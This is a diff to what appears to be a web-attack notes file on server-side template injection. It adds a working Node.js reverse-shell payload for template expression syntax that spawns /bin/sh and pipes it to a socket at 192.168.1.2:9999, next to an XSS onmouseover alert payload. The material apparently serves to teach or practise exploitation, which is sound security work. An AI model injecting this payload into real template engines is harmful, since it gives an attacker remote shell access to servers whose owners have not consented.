@@ -80,6 +80,25 @@ SSTI Example 2
 
   #[a(href="" onmouseover="javascript:alert(42);") alert]
 
+2. Yes, we can still get a shell using the following expression syntax:
+
+  #{ JS Reverse Shell Function }
+
+  We can use the same code from SSTI example 1, but we need to make it a self executing anonmymous function:
+
+    #{
+      (function() {   
+        var x = root.process.mainModule.require;
+        var net = x("net"),cp = x("child_process"), sh = cp.spawn("/bin/sh", []);
+        var client = new net.Socket();
+        client.connect(9999, "192.168.1.2", function(){
+          client.pipe(sh.stdin);
+          sh.stdout.pipe(client);
+          sh.stderr.pipe(client);
+         })
+       })()
+      }
+
 
 MongoDB Injection
 
